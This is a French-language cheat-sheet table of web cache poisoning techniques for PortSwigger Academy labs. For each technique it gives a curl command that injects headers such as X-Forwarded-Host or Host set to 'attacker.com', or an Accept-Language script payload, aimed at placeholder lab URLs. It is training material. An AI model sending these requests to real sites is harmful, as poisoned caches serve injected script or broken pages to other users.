# WEB Cache poisonning

| Type / Lab                                                          | Payload d’attaque neutre (exemple)           | Commande d’attaque (complète, sans Burp)                                                                                                   | Commande(s) d’analyse (complète, sans Burp)                                                                 | Élément d’analyse (raison préalable)                        | Méthodologie détaillée de découverte                                                                                                                                                                                                                                            | URL PortSwigger                                                                                              |
|---------------------------------------------------------------------|----------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|
| **Web Cache Poisoning – XSS via header**                            | `X-Forwarded-Host: attacker.com`             | `curl -H "X-Forwarded-Host: attacker.com" https://<LAB-ID>.web-security-academy.net/`                                                     | `curl -I https://<LAB-ID>.web-security-academy.net/` <br> `curl https://<LAB-ID>.web-security-academy.net/`        | Vérifier si la réponse est reflétée et mise en cache         | L’investigation consiste à manipuler les entêtes HTTP pour observer si leur contenu est réutilisé dans la réponse et si cette réponse est ensuite partagée entre plusieurs utilisateurs[1][5][7].                                         | https://portswigger.net/web-security/web-cache-poisoning                                                 |
| **Web Cache Poisoning – DoS via header**                            | `X-Forwarded-Host: invalid_host`             | `curl -H "X-Forwarded-Host: invalid_host" https://<LAB-ID>.web-security-academy.net/`                                                     | `curl -I https://<LAB-ID>.web-security-academy.net/` <br> `curl https://<LAB-ID>.web-security-academy.net/`        | Détecter si une erreur est stockée et servie à tous          | L’approche repose sur la modification de certains entêtes afin de provoquer une anomalie, puis à vérifier si cette anomalie est persistante pour d’autres clients[3][4][6].                                                              | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws                 |
| **Web Cache Poisoning – Paramètre d’URL**                           | `?lang=fr<script>`                           | `curl "https://<LAB-ID>.web-security-academy.net/page?lang=fr<script>"`                                                                  | `curl -I "https://<LAB-ID>.web-security-academy.net/page?lang=fr<script>"` <br> `curl "https://<LAB-ID>.web-security-academy.net/page?lang=fr"` | Vérifier si le paramètre est reflété dans la réponse et mis en cache | La démarche consiste à injecter différentes valeurs dans les paramètres de l’URL pour voir si elles sont présentes dans la réponse et si cette réponse est réutilisée pour d’autres requêtes similaires[1][5][6].                        | https://portswigger.net/web-security/web-cache-poisoning                                                 |
| **Web Cache Poisoning – Host header**                               | `Host: attacker.com`                         | `curl -H "Host: attacker.com" https://<LAB-ID>.web-security-academy.net/`                                                                | `curl -I https://<LAB-ID>.web-security-academy.net/` <br> `curl https://<LAB-ID>.web-security-academy.net/`        | Tester la prise en compte du Host dans le cache               | L’analyse implique de tester des variations sur l’entête Host pour vérifier si cela permet d’empoisonner la réponse servie à d’autres utilisateurs[2][7][8].                                                                            | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws                 |
| **Web Cache Poisoning – Accept-Language header**                    | `Accept-Language: <script>alert(1);</script>` | `curl -H "Accept-Language: <script>alert(1);</script>" https://<LAB-ID>.web-security-academy.net/`                                       | `curl -I https://<LAB-ID>.web-security-academy.net/` <br> `curl https://<LAB-ID>.web-security-academy.net/`        | Vérifier si la langue est utilisée dans la réponse et le cache | L’investigation consiste à injecter une valeur inhabituelle dans l’entête Accept-Language et à observer si elle est reflétée et mise en cache[6].                                                                                      | https://portswigger.net/web-security/web-cache-poisoning                                                 |

---
